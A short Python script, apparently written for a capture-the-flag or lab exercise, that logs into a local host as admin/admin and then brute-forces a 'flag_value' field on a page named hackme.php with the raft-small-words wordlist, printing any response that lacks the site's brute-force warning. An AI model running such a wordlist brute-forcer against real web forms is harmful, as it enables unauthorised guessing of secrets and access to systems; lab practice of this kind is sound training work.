import requests
lines = []

with open("raft-small-words.txt","r") as raft:
    lines = raft.readlines()

s = requests.Session()

credentials = {
    'username': 'admin',
    'password': 'admin'
}

response = s.post('http://192.168.228.199/check.php', data=credentials)
#print(response.text)

#response1 = s.post('http://192.168.228.199/hackme.php')
#print(response1.text)

for i in lines:
    mydata = {'flag_value':i.replace("\n","")}
    # set post parameter of flag_value to current work in raft-small-words.txt

    response2 = s.post('http://192.168.228.199/hackme.php', data=mydata)
    # post the information to hackme.php using the current session (s)

    currentPageText = response2.text
    # save page to variable

    if "brute-force" not in currentPageText:
        print(response2.text)
        # check to see if text above (brute-force) isn't there. if it's not, show us what was actually returned.
